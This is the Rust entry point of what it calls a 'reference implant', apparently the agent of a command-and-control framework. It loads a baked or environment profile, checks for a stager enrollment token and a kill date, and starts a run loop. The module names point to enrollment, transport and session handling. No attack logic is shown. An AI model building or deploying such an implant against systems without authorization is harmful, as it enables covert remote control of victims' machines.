mod baked;
mod channel;
mod enroll;
mod envelope;
mod error;
mod handlers;
mod outbox;
mod profile;
mod run;
mod sensitive;
mod session;
mod transport;
mod trust;
mod verify;
mod wire;

// The Rust reference implant (architecture.md Sec 12.2): the reach implant
// for targets a managed runtime cannot serve, speaking the shared wire
// protocol. The fielded shape runs entirely off the
// bake; the dev shape (empty bake) runs from ROD_* environment variables.
// The entry point stays deliberately thin: load the profile, run the state
// machine, exit with its answer.

fn main() {
    let Some(profile) =
        profile::Profile::from_baked(baked::PROFILE).or_else(profile::Profile::from_env)
    else {
        eprintln!(
            "rod-implant: this build carries no baked profile and no ROD_* environment; nothing to run"
        );
        std::process::exit(2);
    };
    if profile.token.is_empty() {
        eprintln!("rod-implant: no enrollment credential (bake or ROD_STAGER_TOKEN)");
        std::process::exit(2);
    }
    if profile.kill_date_passed() {
        eprintln!("rod-implant: kill date has passed; refusing to run");
        std::process::exit(1);
    }
    std::process::exit(match run::run(&profile) {
        run::Exit::Terminated(code) => code as i32,
        run::Exit::NoFront => 1,
    });
}
